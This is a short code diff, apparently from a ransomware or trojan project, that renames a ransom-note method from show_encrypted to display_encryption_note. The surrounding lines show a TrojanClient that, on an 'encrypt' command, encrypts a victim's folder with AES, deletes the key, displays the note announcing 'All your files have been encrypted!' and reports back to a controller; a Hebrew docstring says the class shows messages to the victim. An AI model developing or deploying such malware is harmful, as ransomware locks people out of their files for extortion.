@@ -78,7 +78,7 @@ class RansomNote:
     """אחראי על הצגת הודעות לקורבן"""
 
     @staticmethod
-    def show_encrypted(): #sadjasfgahsjsag
+    def display_encryption_note(): #sadjasfgahsjsag
         note = """
         🔒 All your files have been encrypted!
         
@@ -115,7 +115,7 @@ class TrojanClient:
         if action == "encrypt":
             FileEncryptor.encrypt_folder(self.folder, aes_key)
             del aes_key
-            RansomNote.show_encrypted()
+            RansomNote.display_encryption_note()
             protocol.send(self.connection, "the files are encrypted")
 
         elif action == "decrypt":
